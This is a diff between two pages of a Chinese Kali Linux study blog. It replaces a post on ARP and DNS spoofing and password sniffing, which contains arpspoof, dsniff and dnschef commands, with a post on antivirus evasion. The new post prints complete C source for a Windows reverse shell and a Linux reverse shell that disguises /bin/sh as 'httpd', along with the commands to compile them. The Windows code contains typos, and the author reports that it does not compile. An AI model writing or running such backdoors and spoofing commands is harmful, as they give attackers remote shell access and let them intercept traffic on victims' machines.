@@ -79,16 +79,18 @@
 
 
 
-<meta name="description" content="1. 密码嗅探 二、三层地址 IP网络到网络 MAC主机到主机（硬件固化地址，广播寻址） ▲ 路由器不转发广播 ▲ 局域网内MAC寻址，广域网IP寻址   交换机与HUB ▲ HUB是物理层的设备，非二层设备，不识别MAC地址 HUB全端口转发，只要有数据包就转发给本网络所有主机（不安全） 交换机根据学习地址转发，形成APR地址列表 混杂模式抓包   ARP协议（IP地址解析程MAC地址） 免费">
+<meta name="description" content="1. 自己编写后门 ▲ 2020.2.13window的shell都无法通过编译 Windows reverse shell 🔺命令：wine gcc.exe windows_revers_shell.c -o windows.exe -lws2_32    12345678910111213141516171819202122232425262728293031323334353637383">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(六十二)：密码嗅探--ARP地址欺骗、DNS代理欺骗">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;27&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--ARP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97%E3%80%81DNS%E4%BB%A3%E7%90%86%E6%AC%BA%E9%AA%97&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(九十一)：免杀技术--自编写shell">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;13&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E8%87%AA%E7%BC%96%E5%86%99shell&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. 密码嗅探 二、三层地址 IP网络到网络 MAC主机到主机（硬件固化地址，广播寻址） ▲ 路由器不转发广播 ▲ 局域网内MAC寻址，广域网IP寻址   交换机与HUB ▲ HUB是物理层的设备，非二层设备，不识别MAC地址 HUB全端口转发，只要有数据包就转发给本网络所有主机（不安全） 交换机根据学习地址转发，形成APR地址列表 混杂模式抓包   ARP协议（IP地址解析程MAC地址） 免费">
+<meta property="og:description" content="1. 自己编写后门 ▲ 2020.2.13window的shell都无法通过编译 Windows reverse shell 🔺命令：wine gcc.exe windows_revers_shell.c -o windows.exe -lws2_32    12345678910111213141516171819202122232425262728293031323334353637383">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-01-27T15:05:26.942Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.tomassky.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=7bf2JUs5DMtehccBmf4Z5fv69w6jB6oxhpGZ55yIZcluckaHCJO9CdrybGQ8CTjNaH4B64ZYnAGNiQQ3eaRwhNhXMUnob2rCVCQ9AbGqPTFhF1JSP5uMXgA&amp;file_name=&#x2F;linux.sh.PNG">
+<meta property="og:updated_time" content="2020-02-13T12:49:36.267Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;aliyun.tomassky.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=7bf2JUs5DMtehccBmf4Z5fv69w6jB6oxhpGZ55yIZcluckaHCJO9CdrybGQ8CTjNaH4B64ZYnAGNiQQ3eaRwhNhXMUnob2rCVCQ9AbGqPTFhF1JSP5uMXgA&amp;file_name=&#x2F;linux.sh.PNG">
 
 
 
@@ -118,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/01/27/Kali Linux笔记(六十二)：密码嗅探--ARP地址欺骗、DNS代理欺骗/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/02/13/Kali Linux笔记(九十一)：免杀技术--自编写shell/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(六十二)：密码嗅探--ARP地址欺骗、DNS代理欺骗 | Tomas'Blog</title>
+  <title>Kali Linux笔记(九十一)：免杀技术--自编写shell | Tomas'Blog</title>
   
 
 
@@ -243,7 +245,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--ARP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97%E3%80%81DNS%E4%BB%A3%E7%90%86%E6%AC%BA%E9%AA%97/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E8%87%AA%E7%BC%96%E5%86%99shell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -260,7 +262,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(六十二)：密码嗅探--ARP地址欺骗、DNS代理欺骗</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(九十一)：免杀技术--自编写shell</h1>
         
 
         <div class="post-meta">
@@ -272,8 +274,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-27T23:12:02+08:00">
-                2020-01-27
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T20:50:01+08:00">
+                2020-02-13
               </time>
             
 
@@ -326,7 +328,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  808 字
+                  318 字
                 </span>
               
 
@@ -342,7 +344,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3 分钟
+                  1 分钟
                 </span>
               
             </div>
@@ -364,93 +366,24 @@
 
       
         <hr>
-<h4 id="1-密码嗅探"><a href="#1-密码嗅探" class="headerlink" title="1. 密码嗅探"></a>1. 密码嗅探</h4><ul>
-<li>二、三层地址<ul>
-<li>IP网络到网络</li>
-<li>MAC主机到主机（硬件固化地址，广播寻址）</li>
-<li>▲ 路由器不转发广播</li>
-<li>▲ 局域网内MAC寻址，广域网IP寻址</li>
-</ul>
-</li>
-<li>交换机与HUB<ul>
-<li>▲ HUB是物理层的设备，非二层设备，不识别MAC地址</li>
-<li>HUB全端口转发，只要有数据包就转发给本网络所有主机（不安全）</li>
-<li>交换机根据学习地址转发，形成APR地址列表</li>
-<li>混杂模式抓包</li>
-</ul>
-</li>
-<li>ARP协议（IP地址解析程MAC地址）<ul>
-<li>免费ARP</li>
-<li>基于广播学习</li>
-<li>以太网头、ARP头</li>
-<li>▲ 请求、响应相对独立（不请求也可以响应，可以人为构造响应包）</li>
-<li>▲ 基于传闻的协议（无条件接受响应包，ARP地址欺骗根源）</li>
+<h4 id="1-自己编写后门"><a href="#1-自己编写后门" class="headerlink" title="1. 自己编写后门"></a>1. 自己编写后门</h4><ul>
+<li>▲ 2020.2.13window的shell都无法通过编译</li>
+<li>Windows reverse shell<ul>
+<li><strong><code>🔺命令：wine gcc.exe windows_revers_shell.c -o windows.exe -lws2_32</code></strong></li>
 </ul>
 </li>
 </ul>
-<h4 id="2-ARP地址欺骗（Win-7-→-Kali，单向欺骗）"><a href="#2-ARP地址欺骗（Win-7-→-Kali，单向欺骗）" class="headerlink" title="2. ARP地址欺骗（Win 7 → Kali，单向欺骗）"></a>2. ARP地址欺骗（Win 7 → Kali，单向欺骗）</h4><ul>
-<li><strong><code>🔺命令：ping 网关</code></strong>（查看网络连通性）</li>
-<li><strong><code>🔺命令：arp -a</code></strong>（查看网关地址）</li>
-<li>使用OmniPeek构造ARP数据包，先抓取ARP的数据包</li>
-<li><strong><code>🔺命令：arp -d</code></strong>（清除ARP缓存）</li>
-<li><strong><code>🔺命令：ping 网关</code></strong>（重新发arp包）</li>
-<li>选取ARP Response的数据包，Send → Edit Send Packet</li>
-<li><strong><code>🔺命令：ping Kali的IP地址/arp -a</code></strong>（查看Kali的MAC地址）</li>
-<li>Ethernet → 修改目的地的MAC地址为Kali的MAC地址</li>
-<li>Ethernet → 修改源地址的MAC地址为Win7的MAC地址</li>
-<li>ARP → Target Hardware Addr → Kali的MAC地址</li>
-<li>ARP → Target Internet Addr → Kali的IP地址</li>
-<li>Send → Send Window → Transmit One（可能需要持续发包）</li>
-<li>Kali查看arp → <strong><code>🔺命令：arp -an</code></strong></li>
-<li>Win7/kali抓包都可以看到ARP地址欺骗效果（发送ping数据包）</li>
-<li>▲ 2020.1.27 Omnipeek need a Universal C Runtime</li>
-</ul>
-<h4 id="3-ARP地址欺骗（Kali-→-Win7）"><a href="#3-ARP地址欺骗（Kali-→-Win7）" class="headerlink" title="3. ARP地址欺骗（Kali → Win7）"></a>3. ARP地址欺骗（Kali → Win7）</h4><ul>
-<li>手动修改数据包实现ARP欺骗</li>
-<li>arpspoof（双向欺骗+路由转发）<ul>
-<li><strong><code>🔺命令：echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></strong> </li>
-<li><strong><code>🔺命令：arpspoof -t（目标） 1.1.1.12 -r（路由器） 1.1.1.1</code></strong>（发送的是arp的Rely）</li>
-</ul>
-</li>
-<li>网络嗅探<ul>
-<li>driftnet（传输图片的还原）<ul>
-<li>-i（选择端口）</li>
-<li>-a（存放保存）</li>
-<li>-d（存放的路径）</li>
-<li>-s（声音文件的保存）</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：driftnet -i eth0 -a -d /root/Desktop/tem -s</code></strong></li>
-<li><strong><code>🔺命令：webspy -i eth0 1.1.1.1</code></strong>（抓取网络url地址）▲ 2020.1.27只能一个一个进行截取</li>
-<li><strong><code>🔺命令：urlsnarf -i eth0</code></strong>（访问端口截断解析）</li>
-<li><strong><code>🔺命令：dsniff -i eth0 -m</code></strong>（密码嗅探截获）<ul>
-<li>/usr/share/dsniff/dsniff.services（支持协议解码类型）</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：dnsspoof -i eth0 -f /usr/lib/x86_64-linux-gnu/dnsspoof.hosts</code></strong>（DNS欺骗）<ul>
-<li><strong><code>🔺命令：vi /usr/lib/x86_64-linux-gnu/</code></strong>dnsspoof.hosts（侦听目标机器53端口）</li>
-<li>192.168.1.1 → *.taobao.com</li>
-<li>Win7访问<a href="http://www.taobao.com（发生重定向）" target="_blank" rel="noopener">www.taobao.com（发生重定向）</a></li>
-<li>▲ 2020.1.27 dnsspoof无法进行重定向，无法达到DNS欺骗的目的</li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;winsock2.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#pragma comment(lib,&quot;ws2_32&quot;)</span><br><span class="line"></span><br><span class="line">  WSADATA wsaData;</span><br><span class="line">  SOCKET Winsock;</span><br><span class="line">  SOCKET Sock;</span><br><span class="line">  struct sockaddr_in hax;</span><br><span class="line">  char ip_addr[16];</span><br><span class="line">  STARTUPINFO ini_processo;</span><br><span class="line">  PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    WSAStartup(MAKEWORD(2,2),&amp;wsaData);</span><br><span class="line">    Winsock=WSASocket(AF_INET,SOCK_STREM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);</span><br><span class="line"></span><br><span class="line">    if(argc != 3)</span><br><span class="line">    &#123;</span><br><span class="line">        fprintf(stderr,&quot;Uso:&lt;rhost&gt;&lt;rport&gt;\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    struct hostent *host;</span><br><span class="line">    host = gethostbyname(argv[1]);</span><br><span class="line">    strcpy(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">    hax.sin_family = AF_INET;</span><br><span class="line">    hax.sin_port = htons(atoi(argv[2]));</span><br><span class="line">    hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">    WSAConnect(Winsock,(SOCKADDR*)&amp;hax,sizeof(hax),NULL,NULL,NULL,NULL);</span><br><span class="line"></span><br><span class="line">    memset(&amp;ini_processo,0,sizeof(ini_preocesso));</span><br><span class="line">    ini_processo.cb=sizeof(ini_processo);</span><br><span class="line">    ini_processo.dwFlags=STARTF_USESTDHANDLES;</span><br><span class="line">    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)winsock;</span><br><span class="line">    CreateProcess(NULL,&quot;cmd.exe&quot;,NULL,NULL,TRUE,0,NULL,NULL,&amp;ini_processo,&amp;processo_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Linux shell<ul>
+<li><strong><code>🔺命令：gcc -o linux.sh linux_revers_shell.c</code></strong></li>
 </ul>
 </li>
 </ul>
-</li>
-</ul>
-<h4 id="4-DNS代理欺骗（Kali-→-Win7，实现流量的重定向）"><a href="#4-DNS代理欺骗（Kali-→-Win7，实现流量的重定向）" class="headerlink" title="4. DNS代理欺骗（Kali → Win7，实现流量的重定向）"></a>4. DNS代理欺骗（Kali → Win7，实现流量的重定向）</h4><ul>
-<li>前提：有能力修改客户端的网络参数的配置（DNS/Host修改配置）</li>
-<li>dnschef<ul>
-<li>–fakeip（欺骗解析到的IP地址）</li>
-<li>–fakedomains（伪造欺骗的域名）</li>
-<li>–interface（进行网卡欺骗的动作，DNS侦听动作）</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：dnschef --fakeip=1.1.1.10 --fakedomains=www.google.com,www.youtube.com --interface 1.1.1.2（Kali主机IP）-q</code></strong></li>
-<li>将被害者DNS指向伪造的DNS服务器（Win7修改DNS服务器）</li>
-<li>Win7和Kali进行抓包比对</li>
-<li>ping一个没有欺骗的域名看是否正常运作</li>
-<li>▲ 2020.1.27可进行正常运行，也能截获到数据包，但无法进行重定向</li>
-</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    struct sockaddr_in sock;</span><br><span class="line">    int s;</span><br><span class="line">    if(argc != 3)</span><br><span class="line">    &#123;</span><br><span class="line">        fprintf(stderr,&quot;uso:&lt;rhost&gt;&lt;rport&gt;\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    sock.sin_family = AF_INET;</span><br><span class="line">    sock.sin_port = htons(atoi(argv[2]));</span><br><span class="line">    sock.sin_addr.s_addr = inet_addr(argv[1]);</span><br><span class="line">    s=socket(AF_INET,SOCK_STREAM,0);</span><br><span class="line"></span><br><span class="line">    connect(s,(struct sockaddr_in *)&amp;sock,sizeof(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">    dup2(s,0);</span><br><span class="line">    dup2(s,1);</span><br><span class="line">    dup2(s,2);</span><br><span class="line">    execl(&quot;/bin/sh&quot;,&quot;httpd&quot;,(char *)0);  //process httpd</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=7bf2JUs5DMtehccBmf4Z5fv69w6jB6oxhpGZ55yIZcluckaHCJO9CdrybGQ8CTjNaH4B64ZYnAGNiQQ3eaRwhNhXMUnob2rCVCQ9AbGqPTFhF1JSP5uMXgA&file_name=/linux.sh.PNG" alt="linux.sh"></p>
 
       
     </div>
@@ -481,8 +414,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/01/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%80)%EF%BC%9A%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" rel="next" title="Kali Linux笔记(六十一)：离线密码破解">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(六十一)：离线密码破解
+              <a href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E6%A8%A1%E6%9D%BF%E7%A8%8B%E5%BA%8F%E9%99%84%E7%9D%80/" rel="next" title="Kali Linux笔记(九十)：免杀技术--模板程序附着">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(九十)：免杀技术--模板程序附着
               </a>
             
           </div>
@@ -490,10 +423,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%89)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" rel="prev" title="Kali Linux笔记(六十三)：密码嗅探--中间人攻击">
-                Kali Linux笔记(六十三)：密码嗅探--中间人攻击 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -663,7 +592,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-密码嗅探"><span class="nav-number">1.</span> <span class="nav-text">1. 密码嗅探</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-ARP地址欺骗（Win-7-→-Kali，单向欺骗）"><span class="nav-number">2.</span> <span class="nav-text">2. ARP地址欺骗（Win 7 → Kali，单向欺骗）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-ARP地址欺骗（Kali-→-Win7）"><span class="nav-number">3.</span> <span class="nav-text">3. ARP地址欺骗（Kali → Win7）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-DNS代理欺骗（Kali-→-Win7，实现流量的重定向）"><span class="nav-number">4.</span> <span class="nav-text">4. DNS代理欺骗（Kali → Win7，实现流量的重定向）</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-自己编写后门"><span class="nav-number">1.</span> <span class="nav-text">1. 自己编写后门</span></a></li></ol></div>
             
 
           </div>
